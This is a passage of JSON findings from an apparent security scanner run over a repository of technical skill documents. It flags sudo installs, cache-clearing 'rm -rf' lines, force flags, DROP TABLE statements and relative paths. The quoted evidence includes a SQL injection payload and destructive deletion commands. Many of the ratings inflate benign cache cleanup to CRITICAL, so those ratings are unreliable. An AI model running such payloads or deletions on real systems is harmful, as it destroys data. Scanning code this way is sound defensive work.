        "evidence": "wget -qO - https://aquasecurity.github.io/trivy-repo/deb/public.key | sudo apt-key add -",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/containers/container-security.md",
        "line_number": 256,
        "issue": "Privilege escalation",
        "evidence": "echo \"deb https://aquasecurity.github.io/trivy-repo/deb $(lsb_release -sc) main\" | sudo tee -a /etc/apt/sources.list.d/trivy.list",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/containers/container-security.md",
        "line_number": 257,
        "issue": "Privilege escalation",
        "evidence": "sudo apt-get update",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/containers/container-security.md",
        "line_number": 258,
        "issue": "Privilege escalation",
        "evidence": "sudo apt-get install trivy",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "CRITICAL",
        "category": "Dangerous Command",
        "file": "skills/containers/container-security.md",
        "line_number": 309,
        "issue": "Destructive file deletion",
        "evidence": "rm -rf /var/lib/apt/lists/*  # Safe: cleaning package manager cache",
        "recommendation": "Use safer alternatives or require explicit confirmation"
      },
      {
        "severity": "CRITICAL",
        "category": "Dangerous Command",
        "file": "skills/containers/container-security.md",
        "line_number": 319,
        "issue": "Destructive file deletion",
        "evidence": "rm -rf /var/lib/apt/lists/*  # Safe: cleaning package manager cache",
        "recommendation": "Use safer alternatives or require explicit confirmation"
      },
      {
        "severity": "CRITICAL",
        "category": "Dangerous Command",
        "file": "skills/containers/dockerfile-optimization.md",
        "line_number": 80,
        "issue": "Destructive file deletion",
        "evidence": "RUN rm -rf /var/lib/apt/lists/*",
        "recommendation": "Use safer alternatives or require explicit confirmation"
      },
      {
        "severity": "CRITICAL",
        "category": "Dangerous Command",
        "file": "skills/containers/dockerfile-optimization.md",
        "line_number": 90,
        "issue": "Destructive file deletion",
        "evidence": "rm -rf /var/lib/apt/lists/*  # Safe: cleaning package manager cache",
        "recommendation": "Use safer alternatives or require explicit confirmation"
      },
      {
        "severity": "CRITICAL",
        "category": "Dangerous Command",
        "file": "skills/containers/dockerfile-optimization.md",
        "line_number": 320,
        "issue": "Destructive file deletion",
        "evidence": "rm -rf /var/lib/apt/lists/*  # Safe: cleaning package manager cache",
        "recommendation": "Use safer alternatives or require explicit confirmation"
      },
      {
        "severity": "CRITICAL",
        "category": "Dangerous Command",
        "file": "skills/containers/dockerfile-optimization.md",
        "line_number": 337,
        "issue": "Destructive file deletion",
        "evidence": "rm -rf /var/lib/apt/lists/*  # Safe: cleaning package manager cache",
        "recommendation": "Use safer alternatives or require explicit confirmation"
      },
      {
        "severity": "CRITICAL",
        "category": "Dangerous Command",
        "file": "skills/containers/dockerfile-optimization/resources/REFERENCE.md",
        "line_number": 236,
        "issue": "Destructive file deletion",
        "evidence": "&& rm -rf /var/lib/apt/lists/*  # Safe: cleaning package manager cache",
        "recommendation": "Use safer alternatives or require explicit confirmation"
      },
      {
        "severity": "CRITICAL",
        "category": "Dangerous Command",
        "file": "skills/containers/dockerfile-optimization/resources/REFERENCE.md",
        "line_number": 329,
        "issue": "Destructive file deletion",
        "evidence": "rm -rf /var/lib/apt/lists/*  # Safe: cleaning package manager cache",
        "recommendation": "Use safer alternatives or require explicit confirmation"
      },
      {
        "severity": "CRITICAL",
        "category": "Dangerous Command",
        "file": "skills/containers/dockerfile-optimization/resources/REFERENCE.md",
        "line_number": 638,
        "issue": "Destructive file deletion",
        "evidence": "rm -rf /var/lib/apt/lists/* \\  # Safe: cleaning package manager cache",
        "recommendation": "Use safer alternatives or require explicit confirmation"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/containers/dockerfile-optimization/resources/REFERENCE.md",
        "line_number": 650,
        "issue": "Force flag usage",
        "evidence": "npm cache clean --force && \\",
        "recommendation": "Ensure user understands consequences"
      },
      {
        "severity": "CRITICAL",
        "category": "Dangerous Command",
        "file": "skills/containers/dockerfile-optimization/resources/REFERENCE.md",
        "line_number": 651,
        "issue": "Destructive file deletion",
        "evidence": "rm -rf /root/.npm",
        "recommendation": "Use safer alternatives or require explicit confirmation"
      },
      {
        "severity": "CRITICAL",
        "category": "Dangerous Command",
        "file": "skills/containers/dockerfile-optimization/resources/REFERENCE.md",
        "line_number": 796,
        "issue": "Destructive file deletion",
        "evidence": "rm -rf /var/lib/apt/lists/*  # Safe: cleaning package manager cache",
        "recommendation": "Use safer alternatives or require explicit confirmation"
      },
      {
        "severity": "CRITICAL",
        "category": "Dangerous Command",
        "file": "skills/containers/dockerfile-optimization/resources/REFERENCE.md",
        "line_number": 809,
        "issue": "Destructive file deletion",
        "evidence": "rm -rf /var/lib/apt/lists/*  # Safe: cleaning package manager cache",
        "recommendation": "Use safer alternatives or require explicit confirmation"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/containers/dockerfile-optimization/resources/REFERENCE.md",
        "line_number": 827,
        "issue": "Force flag usage",
        "evidence": "npm cache clean --force",
        "recommendation": "Ensure user understands consequences"
      },
      {
        "severity": "CRITICAL",
        "category": "Dangerous Command",
        "file": "skills/containers/dockerfile-optimization/resources/REFERENCE.md",
        "line_number": 1224,
        "issue": "Destructive file deletion",
        "evidence": "rm -rf /var/lib/apt/lists/*  # Safe: cleaning package manager cache",
        "recommendation": "Use safer alternatives or require explicit confirmation"
      },
      {
        "severity": "CRITICAL",
        "category": "Dangerous Command",
        "file": "skills/containers/dockerfile-optimization/resources/REFERENCE.md",
        "line_number": 1260,
        "issue": "Destructive file deletion",
        "evidence": "RUN rm -rf /var/lib/apt/lists/*",
        "recommendation": "Use safer alternatives or require explicit confirmation"
      },
      {
        "severity": "CRITICAL",
        "category": "Dangerous Command",
        "file": "skills/containers/dockerfile-optimization/resources/REFERENCE.md",
        "line_number": 1271,
        "issue": "Destructive file deletion",
        "evidence": "rm -rf /var/lib/apt/lists/*  # Safe: cleaning package manager cache",
        "recommendation": "Use safer alternatives or require explicit confirmation"
      },
      {
        "severity": "CRITICAL",
        "category": "Dangerous Command",
        "file": "skills/containers/dockerfile-optimization/resources/REFERENCE.md",
        "line_number": 1423,
        "issue": "Destructive file deletion",
        "evidence": "rm -rf /var/lib/apt/lists/*  # Safe: cleaning package manager cache",
        "recommendation": "Use safer alternatives or require explicit confirmation"
      },
      {
        "severity": "CRITICAL",
        "category": "Dangerous Command",
        "file": "skills/containers/dockerfile-optimization/resources/REFERENCE.md",
        "line_number": 1551,
        "issue": "Destructive file deletion",
        "evidence": "rm -rf /var/lib/apt/lists/*  # Safe: cleaning package manager cache",
        "recommendation": "Use safer alternatives or require explicit confirmation"
      },
      {
        "severity": "CRITICAL",
        "category": "Dangerous Command",
        "file": "skills/containers/dockerfile-optimization/resources/REFERENCE.md",
        "line_number": 1952,
        "issue": "Destructive file deletion",
        "evidence": "rm -rf /var/lib/apt/lists/*  # Safe: cleaning package manager cache",
        "recommendation": "Use safer alternatives or require explicit confirmation"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/networking/mosh-resilient-ssh.md",
        "line_number": 24,
        "issue": "Privilege escalation",
        "evidence": "sudo apt install mosh",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/networking/mosh-resilient-ssh.md",
        "line_number": 90,
        "issue": "Privilege escalation",
        "evidence": "sudo ufw allow 60000:61000/udp",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/networking/mosh-resilient-ssh.md",
        "line_number": 93,
        "issue": "Privilege escalation",
        "evidence": "sudo ufw allow 60001/udp",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/networking/tailscale-vpn.md",
        "line_number": 49,
        "issue": "Privilege escalation",
        "evidence": "sudo tailscale up",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/networking/tailscale-vpn.md",
        "line_number": 194,
        "issue": "Privilege escalation",
        "evidence": "echo 'net.ipv4.ip_forward = 1' | sudo tee -a /etc/sysctl.conf",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/networking/tailscale-vpn.md",
        "line_number": 195,
        "issue": "Privilege escalation",
        "evidence": "sudo sysctl -p",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/engineering/ci-cd-pipelines.md",
        "line_number": 394,
        "issue": "Force flag usage",
        "evidence": "--force-new-deployment",
        "recommendation": "Ensure user understands consequences"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/engineering/deployment-strategies/resources/REFERENCE.md",
        "line_number": 129,
        "issue": "Force flag usage",
        "evidence": "--force-new-deployment",
        "recommendation": "Ensure user understands consequences"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/engineering/deployment-strategies/resources/REFERENCE.md",
        "line_number": 971,
        "issue": "Force flag usage",
        "evidence": "--force-new-deployment",
        "recommendation": "Ensure user understands consequences"
      },
      {
        "severity": "HIGH",
        "category": "Dangerous Command",
        "file": "skills/engineering/deployment-strategies/resources/REFERENCE.md",
        "line_number": 1668,
        "issue": "Destructive database operation",
        "evidence": "db.execute(\"TRUNCATE user_preferences\")",
        "recommendation": "Require backup and confirmation"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/engineering/monitoring-alerts/resources/examples/runbooks/high-memory-usage.md",
        "line_number": 128,
        "issue": "Privilege escalation",
        "evidence": "sudo slabtop",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/engineering/monitoring-alerts/resources/examples/runbooks/high-memory-usage.md",
        "line_number": 135,
        "issue": "Privilege escalation",
        "evidence": "sudo journalctl -xe | grep -i oom",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/engineering/monitoring-alerts/resources/examples/runbooks/high-memory-usage.md",
        "line_number": 198,
        "issue": "Privilege escalation",
        "evidence": "sudo systemctl restart [service]",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/engineering/monitoring-alerts/resources/examples/runbooks/high-memory-usage.md",
        "line_number": 251,
        "issue": "Privilege escalation",
        "evidence": "sudo fallocate -l 4G /swapfile",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/engineering/monitoring-alerts/resources/examples/runbooks/high-memory-usage.md",
        "line_number": 252,
        "issue": "Privilege escalation",
        "evidence": "sudo chmod 600 /swapfile",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/engineering/monitoring-alerts/resources/examples/runbooks/high-memory-usage.md",
        "line_number": 253,
        "issue": "Privilege escalation",
        "evidence": "sudo mkswap /swapfile",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/engineering/monitoring-alerts/resources/examples/runbooks/high-memory-usage.md",
        "line_number": 254,
        "issue": "Privilege escalation",
        "evidence": "sudo swapon /swapfile",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/engineering/monitoring-alerts/resources/examples/runbooks/high-memory-usage.md",
        "line_number": 316,
        "issue": "Privilege escalation",
        "evidence": "sudo swapoff /swapfile",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/engineering/monitoring-alerts/resources/examples/runbooks/high-memory-usage.md",
        "line_number": 317,
        "issue": "Privilege escalation",
        "evidence": "sudo rm /swapfile",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/infrastructure/terraform-best-practices/resources/REFERENCE.md",
        "line_number": 394,
        "issue": "Privilege escalation",
        "evidence": "\"sudo apt-get update\",",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/infrastructure/terraform-best-practices/resources/REFERENCE.md",
        "line_number": 395,
        "issue": "Privilege escalation",
        "evidence": "\"sudo apt-get install -y nginx\",",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cicd/cd-deployment-patterns.md",
        "line_number": 598,
        "issue": "Force flag usage",
        "evidence": "aws ecs update-service --cluster prod --service myapp --force-new-deployment",
        "recommendation": "Ensure user understands consequences"
      },
      {
        "severity": "CRITICAL",
        "category": "Dangerous Command",
        "file": "skills/cicd/ci-optimization.md",
        "line_number": 654,
        "issue": "Destructive file deletion",
        "evidence": "- run: rm -rf dist node_modules",
        "recommendation": "Use safer alternatives or require explicit confirmation"
      },
      {
        "severity": "HIGH",
        "category": "Dangerous Command",
        "file": "skills/database/apache-iceberg.md",
        "line_number": 46,
        "issue": "Destructive database operation",
        "evidence": "- Supports transforms (year, month, day, hour, bucket, truncate)  <!-- NOTE: truncate is Iceberg's data transform function, not SQL TRUNCATE -->",
        "recommendation": "Require backup and confirmation"
      },
      {
        "severity": "HIGH",
        "category": "Dangerous Command",
        "file": "skills/database/apache-iceberg.md",
        "line_number": 238,
        "issue": "Destructive database operation",
        "evidence": "TruncateTransform(width=10)       # NOTE: Iceberg transform for trimming strings/numbers to width, not SQL TRUNCATE",
        "recommendation": "Require backup and confirmation"
      },
      {
        "severity": "HIGH",
        "category": "Dangerous Command",
        "file": "skills/database/apache-iceberg.md",
        "line_number": 545,
        "issue": "Destructive database operation",
        "evidence": "truncate(W, str)  | PARTITIONED BY (truncate(10, str)) | String prefixes  <!-- NOTE: Iceberg transform function -->",
        "recommendation": "Require backup and confirmation"
      },
      {
        "severity": "HIGH",
        "category": "Dangerous Command",
        "file": "skills/database/apache-iceberg.md",
        "line_number": 558,
        "issue": "Destructive database operation",
        "evidence": "write.metadata.metrics.default=truncate(16)  # NOTE: Iceberg's truncate transform for metrics, not SQL TRUNCATE",
        "recommendation": "Require backup and confirmation"
      },
      {
        "severity": "HIGH",
        "category": "Dangerous Command",
        "file": "skills/database/postgres-migrations.md",
        "line_number": 94,
        "issue": "Destructive database operation",
        "evidence": "DROP TABLE users;",
        "recommendation": "Require backup and confirmation before execution"
      },
      {
        "severity": "HIGH",
        "category": "Dangerous Command",
        "file": "skills/database/postgres-migrations.md",
        "line_number": 455,
        "issue": "Destructive database operation",
        "evidence": "DROP TABLE IF EXISTS old_logs;",
        "recommendation": "Require backup and confirmation before execution"
      },
      {
        "severity": "HIGH",
        "category": "Dangerous Command",
        "file": "skills/database/postgres-migrations/resources/REFERENCE.md",
        "line_number": 165,
        "issue": "Destructive database operation",
        "evidence": "DROP TABLE users;",
        "recommendation": "Require backup and confirmation before execution"
      },
      {
        "severity": "HIGH",
        "category": "Dangerous Command",
        "file": "skills/database/postgres-migrations/resources/REFERENCE.md",
        "line_number": 582,
        "issue": "Destructive database operation",
        "evidence": "DROP TABLE users;",
        "recommendation": "Require backup and confirmation before execution"
      },
      {
        "severity": "HIGH",
        "category": "Dangerous Command",
        "file": "skills/database/postgres-migrations/resources/REFERENCE.md",
        "line_number": 689,
        "issue": "Destructive database operation",
        "evidence": "DROP TABLE IF EXISTS old_temp_table;",
        "recommendation": "Require backup and confirmation before execution"
      },
      {
        "severity": "HIGH",
        "category": "Dangerous Command",
        "file": "skills/database/postgres-migrations/resources/REFERENCE.md",
        "line_number": 1107,
        "issue": "Destructive database operation",
        "evidence": "| DROP TABLE | AccessExclusiveLock | \u2713 | \u2713 |  <!-- Example of operation impact -->",
        "recommendation": "Require backup and confirmation before execution"
      },
      {
        "severity": "HIGH",
        "category": "Dangerous Command",
        "file": "skills/database/postgres-migrations/resources/REFERENCE.md",
        "line_number": 1498,
        "issue": "Destructive database operation",
        "evidence": "DROP TABLE users; -- \u26a0\ufe0f  Loses data!",
        "recommendation": "Require backup and confirmation before execution"
      },
      {
        "severity": "CRITICAL",
        "category": "Dangerous Command",
        "file": "skills/database/postgres-migrations/resources/REFERENCE.md",
        "line_number": 1558,
        "issue": "Destructive file deletion",
        "evidence": "rm -rf $PGDATA/*",
        "recommendation": "Use safer alternatives or require explicit confirmation"
      },
      {
        "severity": "HIGH",
        "category": "Dangerous Command",
        "file": "skills/database/postgres-migrations/resources/REFERENCE.md",
        "line_number": 1891,
        "issue": "Destructive database operation",
        "evidence": "DROP TABLE events_2023_01;",
        "recommendation": "Require backup and confirmation before execution"
      },
      {
        "severity": "HIGH",
        "category": "Dangerous Command",
        "file": "skills/database/postgres-migrations/resources/examples/docker/README.md",
        "line_number": 191,
        "issue": "Destructive database operation",
        "evidence": "DROP TABLE IF EXISTS orders CASCADE;",
        "recommendation": "Require backup and confirmation before execution"
      },
      {
        "severity": "HIGH",
        "category": "Dangerous Command",
        "file": "skills/database/postgres-migrations/resources/examples/docker/README.md",
        "line_number": 192,
        "issue": "Destructive database operation",
        "evidence": "DROP TABLE IF EXISTS users CASCADE;",
        "recommendation": "Require backup and confirmation before execution"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/database/postgres-migrations/resources/examples/docker/README.md",
        "line_number": 331,
        "issue": "Privilege escalation",
        "evidence": "sudo ufw allow 5432/tcp",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/database/postgres-query-optimization/resources/scripts/README.md",
        "line_number": 98,
        "issue": "Privilege escalation",
        "evidence": "sudo apt-get install postgresql-client",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/database/postgres-query-optimization/resources/scripts/README.md",
        "line_number": 105,
        "issue": "Privilege escalation",
        "evidence": "sudo apt-get install jq",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/database/postgres-query-optimization/resources/scripts/README.md",
        "line_number": 294,
        "issue": "Privilege escalation",
        "evidence": "sudo apt-get install jq",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/distributed-systems/consensus-raft/resources/scripts/README.md",
        "line_number": 117,
        "issue": "Privilege escalation",
        "evidence": "sudo mv etcd-v3.5.10-linux-amd64/etcd* /usr/local/bin/",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "HIGH",
        "category": "Dangerous Command",
        "file": "skills/formal/smt-theory-applications.md",
        "line_number": 731,
        "issue": "Destructive database operation",
        "evidence": "malicious = String(\"'; DROP TABLE users; --\")",
        "recommendation": "Require backup and confirmation before execution"
      },
      {
        "severity": "HIGH",
        "category": "Dangerous Command",
        "file": "skills/formal/smt-theory-applications.md",
        "line_number": 734,
        "issue": "Destructive database operation",
        "evidence": "s.add(Contains(query, String(\"DROP TABLE\")))",
        "recommendation": "Require backup and confirmation before execution"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/collaboration/github/github-pull-requests.md",
        "line_number": 580,
        "issue": "Force flag usage",
        "evidence": "git push --force origin feature/auth",
        "recommendation": "Ensure user understands consequences"
      },
      {
        "severity": "CRITICAL",
        "category": "Dangerous Command",
        "file": "skills/collaboration/github/github-actions-workflows/resources/REFERENCE.md",
        "line_number": 1941,
        "issue": "Destructive file deletion",
        "evidence": "rm -rf node_modules  # Safe: cleaning CI cache",
        "recommendation": "Use safer alternatives or require explicit confirmation"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/mobile/react-native-setup.md",
        "line_number": 69,
        "issue": "Privilege escalation",
        "evidence": "- **CocoaPods**: `sudo gem install cocoapods`",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "CRITICAL",
        "category": "Dangerous Command",
        "file": "skills/mobile/react-native-setup.md",
        "line_number": 250,
        "issue": "Destructive file deletion",
        "evidence": "\"clean\": \"rm -rf node_modules ios/Pods ios/build android/build\",  # Cleans build artifacts only - safe to run",
        "recommendation": "Use safer alternatives or require explicit confirmation"
      },
      {
        "severity": "CRITICAL",
        "category": "Dangerous Command",
        "file": "skills/mobile/react-native-setup.md",
        "line_number": 251,
        "issue": "Destructive file deletion",
        "evidence": "\"clean:metro\": \"rm -rf $TMPDIR/metro-* $TMPDIR/haste-*\",  # Cleans Metro bundler cache - safe to run",
        "recommendation": "Use safer alternatives or require explicit confirmation"
      },
      {
        "severity": "CRITICAL",
        "category": "Dangerous Command",
        "file": "skills/mobile/react-native-setup.md",
        "line_number": 392,
        "issue": "Destructive file deletion",
        "evidence": "\u2705 Clear cache with `npm run clean:metro` or `rm -rf $TMPDIR/metro-*`  (safe - cleans Metro cache)",
        "recommendation": "Use safer alternatives or require explicit confirmation"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cryptography/resources/hsm-integration/examples/03-yubihsm-setup.py",
        "line_number": 43,
        "issue": "Privilege escalation",
        "evidence": "print(\"\\nStart connector with: sudo systemctl start yubihsm-connector\", file=sys.stderr)",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cryptography/resources/hsm-integration/examples/02-aws-cloudhsm-integration.py",
        "line_number": 289,
        "issue": "Privilege escalation",
        "evidence": "print(\"2. Install: sudo yum install -y ./cloudhsm-client-*.rpm\", file=sys.stderr)",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cryptography/resources/hsm-integration/examples/02-aws-cloudhsm-integration.py",
        "line_number": 290,
        "issue": "Privilege escalation",
        "evidence": "print(\"3. Configure: sudo /opt/cloudhsm/bin/configure -a <cluster-ip>\", file=sys.stderr)",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cryptography/certificate-management/resources/scripts/renew_certificates.py",
        "line_number": 275,
        "issue": "Force flag usage",
        "evidence": "cmd.append('--force-renewal')",
        "recommendation": "Ensure user understands consequences"
      },
      {
        "severity": "HIGH",
        "category": "Dangerous Command",
        "file": "skills/security/vulnerability-assessment/resources/scripts/test_owasp_top10.py",
        "line_number": 199,
        "issue": "Destructive database operation",
        "evidence": "\"'; DROP TABLE users; --\",  # Example of destructive injection payload",
        "recommendation": "Require backup and confirmation before execution"
      },
      {
        "severity": "CRITICAL",
        "category": "Dangerous Command",
        "file": "skills/containers/dockerfile-optimization/resources/scripts/analyze_dockerfile.py",
        "line_number": 220,
        "issue": "Destructive file deletion",
        "evidence": "if 'apt-get install' in line and 'rm -rf /var/lib/apt/lists/*' not in line:",
        "recommendation": "Use safer alternatives or require explicit confirmation"
      },
      {
        "severity": "CRITICAL",
        "category": "Dangerous Command",
        "file": "skills/containers/dockerfile-optimization/resources/scripts/analyze_dockerfile.py",
        "line_number": 222,
        "issue": "Destructive file deletion",
        "evidence": "if not self._is_multiline_command_with_cleanup(i, 'rm -rf /var/lib/apt/lists/*'):",
        "recommendation": "Use safer alternatives or require explicit confirmation"
      },
      {
        "severity": "CRITICAL",
        "category": "Dangerous Command",
        "file": "skills/containers/dockerfile-optimization/resources/scripts/analyze_dockerfile.py",
        "line_number": 229,
        "issue": "Destructive file deletion",
        "evidence": "recommendation='Add: && rm -rf /var/lib/apt/lists/* in same RUN'",
        "recommendation": "Use safer alternatives or require explicit confirmation"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/containers/dockerfile-optimization/resources/scripts/analyze_dockerfile.py",
        "line_number": 260,
        "issue": "Force flag usage",
        "evidence": "recommendation='Add: && npm cache clean --force'",
        "recommendation": "Ensure user understands consequences"
      },
      {
        "severity": "HIGH",
        "category": "Dangerous Command",
        "file": "skills/database/postgres-migrations/resources/scripts/generate_migration.py",
        "line_number": 89,
        "issue": "Destructive database operation",
        "evidence": "drop_sql = f\"DROP TABLE IF EXISTS {table_name};\"",
        "recommendation": "Require backup and confirmation before execution"
      },
      {
        "severity": "HIGH",
        "category": "Dangerous Command",
        "file": "skills/database/postgres-migrations/resources/scripts/analyze_migration.py",
        "line_number": 121,
        "issue": "Destructive database operation",
        "evidence": "(r'\\bDROP\\s+TABLE\\s+(?!IF\\s+EXISTS)', 'DROP TABLE without IF EXISTS'),",
        "recommendation": "Require backup and confirmation before execution"
      },
      {
        "severity": "HIGH",
        "category": "Dangerous Command",
        "file": "skills/distributed-systems/event-sourcing/resources/examples/python/user_projection.py",
        "line_number": 201,
        "issue": "Destructive database operation",
        "evidence": "cursor.execute(f\"TRUNCATE TABLE {self.projection_name}\")",
        "recommendation": "Require backup and confirmation"
      },
      {
        "severity": "CRITICAL",
        "category": "Dangerous Command",
        "file": "skills/cloud/aws-lambda-deployment/resources/scripts/test_function.sh",
        "line_number": 244,
        "issue": "Destructive file deletion",
        "evidence": "trap \"rm -rf $tmp_dir\" EXIT  # Test cleanup - safe in test context",
        "recommendation": "Use safer alternatives or require explicit confirmation"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/realtime/websocket-implementation/resources/scripts/analyze_traffic.sh",
        "line_number": 233,
        "issue": "Privilege escalation",
        "evidence": "timeout \"${duration}s\" sudo tcpdump -i \"$interface\" -w \"$output\" -s 0 \"$filter\" 2>&1 | while read -r line; do",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/realtime/websocket-implementation/resources/scripts/analyze_traffic.sh",
        "line_number": 240,
        "issue": "Privilege escalation",
        "evidence": "sudo tcpdump -i \"$interface\" -w \"$output\" -s 0 \"$filter\"",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "CRITICAL",
        "category": "Dangerous Command",
        "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
        "line_number": 41,
        "issue": "Destructive file deletion",
        "evidence": "trap 'rm -rf \"$TEMP_DIR\"' EXIT  # Test cleanup - safe in test context",
        "recommendation": "Use safer alternatives or require explicit confirmation"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cryptography/certificate-management/resources/examples/bash/certbot-automation.sh",
        "line_number": 224,
        "issue": "Force flag usage",
        "evidence": "--force-renewal",
        "recommendation": "Ensure user understands consequences"
      },
      {
        "severity": "CRITICAL",
        "category": "Dangerous Command",
        "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
        "line_number": 413,
        "issue": "Destructive file deletion",
        "evidence": "trap 'rm -rf \"$TEMP_DIR\"' EXIT  # Test cleanup - safe in test context",
        "recommendation": "Use safer alternatives or require explicit confirmation"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
        "line_number": 294,
        "issue": "Privilege escalation",
        "evidence": "echo \"  Ubuntu/Debian: sudo apt-get install jq\" >&2",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "HIGH",
        "category": "Dangerous Command",
        "file": "skills/testing/integration-testing/resources/examples/typescript/test_api_integration.test.ts",
        "line_number": 189,
        "issue": "Destructive database operation",
        "evidence": "await pool.query('DROP TABLE IF EXISTS users');",
        "recommendation": "Require backup and confirmation before execution"
      },
      {
        "severity": "HIGH",
        "category": "Dangerous Command",
        "file": "skills/testing/integration-testing/resources/examples/typescript/test_api_integration.test.ts",
        "line_number": 195,
        "issue": "Destructive database operation",
        "evidence": "await pool.query('TRUNCATE TABLE users RESTART IDENTITY CASCADE');",
        "recommendation": "Require backup and confirmation"
      }
    ],
    "Path Traversal Risk": [
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/api/api-authentication/resources/scripts/README.md",
        "line_number": 368,
        "issue": "Path traversal pattern",
        "evidence": "- `../REFERENCE.md` - Detailed JWT/OAuth specifications",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/api/api-authentication/resources/scripts/README.md",
        "line_number": 369,
        "issue": "Path traversal pattern",
        "evidence": "- `../examples/` - Implementation examples",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/api/api-authentication/resources/scripts/README.md",
        "line_number": 370,
        "issue": "Path traversal pattern",
        "evidence": "- Main skill: `../../api-authentication.md`",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/cloud/aws-lambda-deployment/resources/REFERENCE.md",
        "line_number": 1255,
        "issue": "Path traversal pattern",
        "evidence": "zip -r ../layer.zip .",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/cloud/aws-lambda-deployment/resources/REFERENCE.md",
        "line_number": 3057,
        "issue": "Path traversal pattern",
